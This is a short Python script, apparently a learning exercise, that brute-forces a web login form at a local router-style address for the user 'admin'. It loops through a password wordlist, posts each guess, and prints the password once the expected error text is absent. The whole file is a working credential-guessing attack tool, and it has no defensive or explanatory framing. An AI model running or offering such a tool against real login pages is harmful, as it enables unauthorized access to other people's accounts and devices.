import requests

target_url = "http://192.168.100.1/"
data_dict = {"name": "admin", "password": "", "Login": "submit"}
# response = requests.post(target_url, data=data_dict)
# print(response.content)
with open("/root/PycharmProjects/crawler/password_list", "r") as passwords:
    for line in passwords:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if "Error 501: Not Implemented<" not in response.content:
            print("[+] Got the password >> " + word)
            exit()
print("[+] Reached end of line")
